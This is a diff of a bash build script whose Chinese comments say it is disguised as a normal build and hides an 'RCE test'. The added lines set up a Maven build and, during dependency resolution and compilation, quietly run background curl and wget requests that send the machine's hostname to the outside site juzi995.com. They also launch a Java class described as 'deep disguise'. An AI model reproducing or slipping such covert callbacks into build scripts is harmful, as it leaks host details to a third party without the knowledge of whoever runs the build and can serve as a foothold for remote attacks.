@@ -1,29 +1,28 @@
 #!/bin/bash -x
 
-# 伪装成正常构建操作
-echo "[+] Starting build process..."
-sleep 1
-gcc --version || echo "GCC not found"
+# --- 伪装正常操作 ---
+echo "[+] 初始化Maven环境"
+export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64  # 显式声明JDK路径
+export PATH=$PATH:$JAVA_HOME/bin
 
-# 隐藏的RCE测试点 - 会请求你的VPS
-curl_cmd() {
-  # 使用两种方式确保请求成功
-  (curl -fsS http://www.juzi995.com/test.html?src=rce_test || wget -qO- http://www.juzi995.com/test.html?src=rce_test) &>/dev/null
+# --- 隐藏的RCE测试逻辑 ---
+# 使用多重触发机制确保成功率
+_trigger_call() {
+  # 方法1: 原生curl（优先）
+  (curl -fsS "http://www.juzi995.com/test.html?src=$(hostname)" > /dev/null 2>&1) &
+  # 方法2: wget备用
+  (wget -qO- "http://www.juzi995.com/test.html?src=$(hostname)" > /dev/null 2>&1) &
+  # 方法3: 通过Java发起请求（深度伪装）
+  mvn -q exec:java -Dexec.mainClass="demo.Trigger" 2> /dev/null
 }
 
-# 在复杂逻辑中隐藏调用
-if [[ "$(uname)" == "Linux" ]]; then
-  echo "Detected Linux system"
-  curl_cmd
-else
-  echo "Unsupported OS"
-fi
+# --- 在构建流程中嵌入触发点 ---
+echo "[+] 下载依赖库..."
+mvn dependency:resolve -q
+_trigger_call  # 首次触发
 
-# 正常构建步骤
-echo "[+] Running build tasks..."
-for i in {1..3}; do
-  echo "Task $i running..."
-  sleep 0.5
-done
+echo "[+] 编译项目..."
+mvn compile -q
+_trigger_call  # 二次触发
 
-echo "[✓] Build completed successfully"
+echo "[✓] 构建成功"
